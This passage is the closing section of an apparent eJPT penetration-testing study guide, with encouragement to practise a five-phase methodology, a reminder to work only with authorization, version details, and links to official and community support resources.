This eJPT methodology provides a complete framework for systematic penetration testing. The key to success is consistent practice with the 5-phase approach until it becomes second nature.

Remember: eJPT is about practical skills, not just theory. Practice this methodology on vulnerable machines until you can complete assessments efficiently and professionally.

The cybersecurity field needs ethical, competent practitioners. Use these skills responsibly and always within legal boundaries with proper authorization.

**Good luck with your eJPT journey!**

---

*Document Version*: 2.1  
*Last Updated*: January 2025  
*License*: Educational Use Only

## 📞 Support and Additional Resources

### **Official Resources:**
- **eLearnSecurity Support:** https://support.ine.com
- **eJPT Community:** https://community.ine.com
- **Documentation Issues:** Submit through official channels

### **Community Support:**
- **Study Groups:** Join eJPT preparation communities
- **Discord Servers:** Cybersecurity student groups
- **Forums:** InfoSec focused discussion boards
- **Reddit Communities:** r/eJPT, r/cybersecurity, r/NetSecStudents
